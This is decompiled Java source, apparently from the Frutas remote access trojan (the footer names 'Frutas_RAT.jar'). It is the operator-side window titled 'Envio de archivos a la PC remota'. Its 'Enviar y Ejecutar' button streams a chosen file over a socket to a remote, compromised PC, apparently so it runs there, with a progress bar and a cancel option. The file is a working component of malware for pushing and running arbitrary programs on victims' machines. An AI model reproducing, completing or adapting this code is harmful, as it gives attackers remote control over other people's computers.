/*     */ package cliente;
/*     */ 
/*     */ import java.awt.Color;
/*     */ import java.awt.Container;
/*     */ import java.awt.Cursor;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.awt.event.ActionListener;
/*     */ import java.io.File;
/*     */ import java.io.FileInputStream;
/*     */ import java.io.IOException;
/*     */ import java.io.ObjectOutputStream;
/*     */ import java.io.PrintStream;
/*     */ import java.util.ResourceBundle;
/*     */ import java.util.logging.Level;
/*     */ import java.util.logging.Logger;
/*     */ import javax.swing.GroupLayout;
/*     */ import javax.swing.GroupLayout.Alignment;
/*     */ import javax.swing.GroupLayout.ParallelGroup;
/*     */ import javax.swing.GroupLayout.SequentialGroup;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JFileChooser;
/*     */ import javax.swing.JInternalFrame;
/*     */ import javax.swing.JProgressBar;
/*     */ import javax.swing.JTextField;
/*     */ import javax.swing.LayoutStyle.ComponentPlacement;
/*     */ 
/*     */ public class EnviarFile extends JInternalFrame
/*     */   implements SoporteLenguaje
/*     */ {
/*  22 */   private JFileChooser cd = new JFileChooser();
/*     */   private ObjectOutputStream sal;
/*     */   private Envia envia;
/*     */   private JButton jButton1;
/*     */   private JButton jButton2;
/*     */   private JProgressBar jProgressBar1;
/*     */   private JTextField ruta;
/*     */   private JButton search;
/*     */ 
/*     */   public EnviarFile(ObjectOutputStream out, ResourceBundle rb)
/*     */   {
/*  31 */     initComponents();
/*     */ 
/*  34 */     this.sal = out;
/*  35 */     changeLenguage(rb);
/*     */   }
/*     */ 
/*     */   public void Cierra()
/*     */   {
/*     */     try {
/*  41 */       this.sal.close();
/*     */     } catch (IOException ex) {
/*  43 */       System.out.println("Cerre la venta de enviar archivo");
/*     */     }
/*  45 */     dispose();
/*     */   }
/*     */ 
/*     */   private void initComponents()
/*     */   {
/*  56 */     this.jButton2 = new JButton();
/*  57 */     this.search = new JButton();
/*  58 */     this.ruta = new JTextField();
/*  59 */     this.jProgressBar1 = new JProgressBar();
/*  60 */     this.jButton1 = new JButton();
/*     */ 
/*  62 */     setClosable(true);
/*  63 */     setIconifiable(true);
/*  64 */     setTitle("Envio de archivos a la PC remota");
/*     */ 
/*  66 */     this.jButton2.setText("Enviar y Ejecutar");
/*  67 */     this.jButton2.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/*  69 */         EnviarFile.this.jButton2ActionPerformed(evt);
/*     */       }
/*     */     });
/*  73 */     this.search.setText("Buscar Archivo");
/*  74 */     this.search.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/*  76 */         EnviarFile.this.searchActionPerformed(evt);
/*     */       }
/*     */     });
/*  80 */     this.jProgressBar1.setForeground(new Color(255, 102, 0));
/*  81 */     this.jProgressBar1.setCursor(new Cursor(0));
/*  82 */     this.jProgressBar1.setOpaque(true);
/*  83 */     this.jProgressBar1.setStringPainted(true);
/*     */ 
/*  85 */     this.jButton1.setText("Cancelar");
/*  86 */     this.jButton1.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/*  88 */         EnviarFile.this.jButton1ActionPerformed(evt);
/*     */       }
/*     */     });
/*  92 */     GroupLayout layout = new GroupLayout(getContentPane());
/*  93 */     getContentPane().setLayout(layout);
/*  94 */     layout.setHorizontalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addContainerGap().addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addComponent(this.jProgressBar1, -1, -1, 32767).addGroup(layout.createSequentialGroup().addComponent(this.ruta, -2, 267, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.search, -1, -1, 32767)).addGroup(layout.createSequentialGroup().addGap(0, 0, 32767).addComponent(this.jButton2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jButton1))).addContainerGap()));
/*     */ 
/* 111 */     layout.setVerticalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addContainerGap().addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE).addComponent(this.ruta, -2, -1, -2).addComponent(this.search)).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jProgressBar1, -2, 25, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED, 18, 32767).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE).addComponent(this.jButton2).addComponent(this.jButton1)).addContainerGap()));
/*     */ 
/* 127 */     pack();
/*     */   }
/*     */ 
/*     */   private void searchActionPerformed(ActionEvent evt) {
/* 131 */     if (this.cd.showOpenDialog(null) == 0)
/* 132 */       this.ruta.setText(this.cd.getSelectedFile().getAbsolutePath());
/*     */   }
/*     */ 
/*     */   private void jButton2ActionPerformed(ActionEvent evt)
/*     */   {
/*     */     try
/*     */     {
/* 139 */       FileInputStream in = new FileInputStream(this.ruta.getText());
/* 140 */       long tam = this.cd.getSelectedFile().length();
/* 141 */       String nombre = this.cd.getSelectedFile().getName();
/*     */ 
/* 145 */       this.sal.writeUTF(nombre);
/* 146 */       this.envia = new Envia(tam, this.jProgressBar1, in, this.sal, this);
/* 147 */       this.envia.start();
/*     */     }
/*     */     catch (Exception ex)
/*     */     {
/* 151 */       Logger.getLogger(EnviarFile.class.getName()).log(Level.SEVERE, null, ex);
/*     */     }
/*     */   }
/*     */ 
/*     */   private void jButton1ActionPerformed(ActionEvent evt)
/*     */   {
/* 158 */     this.envia.stooop();
/*     */   }
/*     */ 
/*     */   public void changeLenguage(ResourceBundle rb)
/*     */   {
/* 167 */     setTitle(rb.getString("envia.titulo"));
/* 168 */     this.search.setText(rb.getString("envia.busca"));
/* 169 */     this.jButton2.setText(rb.getString("envia.envia"));
/* 170 */     this.jButton1.setText(rb.getString("envia.cancela")); } 
/*     */   private class Envia extends Thread { private long tam;
/*     */     private JProgressBar barra;
/*     */     private FileInputStream in;
/*     */     private ObjectOutputStream out;
/*     */     private EnviarFile en;
/*     */ 
/* 180 */     public Envia(long tam, JProgressBar barra, FileInputStream in, ObjectOutputStream out, EnviarFile env) { this.tam = tam;
/* 181 */       this.barra = barra;
/* 182 */       this.in = in;
/* 183 */       this.out = out;
/* 184 */       this.en = env;
/*     */     }
/*     */ 
/*     */     public void run()
/*     */     {
/* 190 */       int acumulado = 0;
/* 191 */       byte[] Buf = new byte[1024];
/*     */       try
/*     */       {
/*     */         int i;
/* 193 */         while ((i = this.in.read(Buf)) > -1) {
/* 194 */           this.out.write(Buf, 0, i);
/* 195 */           acumulado += i;
/* 196 */           this.barra.setValue((int)(acumulado * 100 / this.tam));
/*     */         }
/*     */       } catch (Exception e) {
/* 199 */         System.out.println("Cerre el soket de envio");
/*     */       }
/*     */       finally {
/*     */         try {
/* 203 */           this.out.close();
/* 204 */           this.in.close();
/*     */         }
/*     */         catch (IOException ex) {
/*     */         }
/*     */       }
/* 209 */       this.en.dispose();
/*     */     }
/*     */ 
/*     */     public void stooop()
/*     */     {
/*     */       try {
/* 215 */         this.out.close();
/*     */       } catch (IOException ex) {
/* 217 */         System.out.println("Cerre el envio de archivo, se cancelo");
/*     */         try {
/* 219 */           this.in.close();
/*     */         }
/*     */         catch (IOException ex1)
/*     */         {
/*     */         }
/*     */       }
/*     */     }
/*     */   }
/*     */ }

/* Location:           C:\Users\Danilo\Desktop\Coisas\Frutas_RAT.jar
 * Qualified Name:     cliente.EnviarFile
 * JD-Core Version:    0.6.2
 */